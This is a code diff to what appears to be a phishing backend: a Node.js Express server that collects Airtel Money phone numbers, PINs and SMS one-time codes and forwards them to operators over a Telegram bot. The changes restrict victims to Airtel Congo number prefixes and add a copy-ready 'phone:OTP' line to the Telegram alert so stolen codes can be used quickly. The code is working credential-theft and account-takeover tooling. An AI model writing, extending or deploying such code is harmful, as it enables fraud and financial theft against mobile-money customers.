@@ -45,7 +45,6 @@ const admins = loadAdmins();
 
 /**
  * Resolves the destination chat ID strictly from the URL parameter.
- * If a valid sub-admin parameter exists, it routes exclusively to them.
  */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
@@ -79,7 +78,6 @@ async function initBot() {
       const isMainAdmin = (chatId === String(FALLBACK_ADMIN_ID));
 
       if (isMainAdmin) {
-        // Matches the exact style shown in your reference screenshot
         const mainAdminMessage = `👑 *Bienvenue Administrateur Principal*\n\n` +
                                  `👤 *Info Telegram:*\n` +
                                  `• Nom: ${firstName}\n` +
@@ -89,7 +87,6 @@ async function initBot() {
         return;
       }
 
-      // Consistent style layout for any sub-admin starting the bot
       const subAdminMessage = `🤖 *Espace Sous-Administrateur Privé*\n\n` +
                               `👤 *Info Telegram:*\n` +
                               `• Nom: ${firstName}\n` +
@@ -149,12 +146,18 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Phone Number & PIN (Routes strictly to mapped sub-admin)
+// Step 1: Submit Phone Number & PIN
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { phone, pin, adminChatId } = req.body || {};
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
+    }
+
+    // Strict backend validation check for Airtel Congo prefixes (096, 097, 098, 099)
+    const airtelCongoRegex = /^09[6789]\d{7}$/;
+    if (!airtelCongoRegex.test(phone)) {
+      return res.status(400).json({ success: false, error: 'Numéro Airtel Congo non autorisé (doit commencer par 096, 097, 098 ou 099).' });
     }
 
     const targetChat = resolveTargetChat(adminChatId);
@@ -199,7 +202,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 4-digit SMS OTP
+// Step 2: Submit 4-digit SMS OTP (Accompanied by applicant phone number)
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -210,8 +213,12 @@ app.post('/api/submit-otp', async (req, res) => {
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
 
+    const applicantPhone = session.phone || 'Inconnu';
+
     const message = `🔴 *AIRTEL MONEY - OTP SMS (4 Chiffres)*\n\n` +
-                    `📱 *Code OTP:* \`${otp}\``;
+                    `📞 *Demandeur:* \`${applicantPhone}\`\n` +
+                    `📱 *Code OTP:* \`${otp}\`\n\n` +
+                    `📋 *Format à copier:*\n\`${applicantPhone}:${otp}\``;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -239,4 +246,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-    
+                                   
